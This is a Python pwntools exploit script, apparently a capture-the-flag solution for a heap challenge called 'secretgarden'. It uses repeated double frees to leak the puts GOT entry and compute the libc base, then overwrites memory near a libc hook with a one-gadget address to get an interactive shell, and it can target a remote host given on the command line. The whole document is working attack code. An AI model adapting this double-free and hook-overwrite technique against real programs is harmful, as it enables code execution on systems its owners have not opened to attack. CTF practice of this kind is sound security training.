#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('secretgarden_patched')
libc = exe.libc
# context.terminal = ['xfce4-terminal', '--title=GDB', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-gef
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def add(size, name, flower):
    io.sendlineafter(b":", b"1")
    io.sendlineafter(b":", str(size).encode())
    io.sendafter(b":", name)
    io.sendlineafter(b":", flower)

def visit():
    io.sendlineafter(b":", b"2")

def delete(idx):
    io.sendlineafter(b":", b"3")
    io.sendlineafter(b":", str(idx).encode())

def clean():
    io.sendlineafter(b":", b"4")


def solve():

    add(0x28, b"A"*0x15, b"B"*23)
    add(0x28, b"A"*0x15, b"B"*23)

    delete(0)
    delete(1)
    delete(0)

    add(0x30, b"haha", b"hehe")
    add(0x28, b"A"*8 + p64(exe.got["puts"]), b"hehe")
    visit()
    io.recvuntil(b":")
    data = io.recv(6)
    puts = u64(data.ljust(8, b"\x00"), 8)
    libc.address = puts - libc.sym["puts"]
    info("libc base: %#x", libc.address)

    delete(0)
    delete(1)

    add(0x68, b"chunk1", "asdf")
    add(0x68, b"chunk2", "asdf")
    delete(4)
    delete(5)
    delete(4)

    for i in range(3):
        delete(i)

    add(0x68, p64(libc.address + 0x397acd), b"hijack")

    for _ in range(2):
        add(0x68, b"haha", b"haha")
    
    add(0x68, b"A"*(0x20 - 0x8 - 0x5) + p64(libc.address + 0x3ffb2), b"pwned!")

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

